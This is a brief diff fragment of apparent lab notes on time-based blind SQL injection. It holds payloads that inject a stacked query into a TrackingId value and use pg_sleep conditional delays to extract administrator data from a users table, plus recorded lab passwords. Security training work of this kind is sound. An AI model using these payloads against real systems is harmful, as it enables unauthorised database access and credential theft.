@@ -31,8 +31,4 @@ SELECT ???? FROM ???? WHERE TrackingId = 'JRyX3o4aOGu50jYI';SELECT+CASE+WHEN+(SU
 
 
 
-
-
--- Password: f7gg1ve4xvpevi0i8y5w
-
-SELECT ???? FROM ???? WHERE TrackingId = 'JRyX3o4aOGu50jYI'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+username+FROM+users+WHERE+username='administrator'),1,1)>'z')+THEN+NULL+ELSE+pg_sleep(5)+END--'???--   No Delay
+-- Password: f6h6dyqp5t8qfmt6ctkm
